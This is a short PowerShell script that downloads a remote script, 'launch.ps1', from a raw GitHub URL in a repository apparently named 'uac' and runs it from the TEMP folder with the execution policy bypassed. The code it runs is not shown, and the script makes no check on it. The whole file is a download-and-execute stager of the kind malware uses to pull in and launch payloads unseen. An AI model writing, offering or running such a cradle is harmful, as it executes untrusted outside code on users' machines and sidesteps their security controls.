[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$DownloadURL = 'https://raw.githubusercontent.com/stenehzin/uac/main/launch.ps1'
$TempPath = $env:TEMP
$FilePath = Join-Path $TempPath 'launch.ps1'

Write-Host "Downloading..."

Invoke-WebRequest -Uri $DownloadURL -OutFile $FilePath -UseBasicParsing

Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$FilePath`""

Write-Host "Process completed."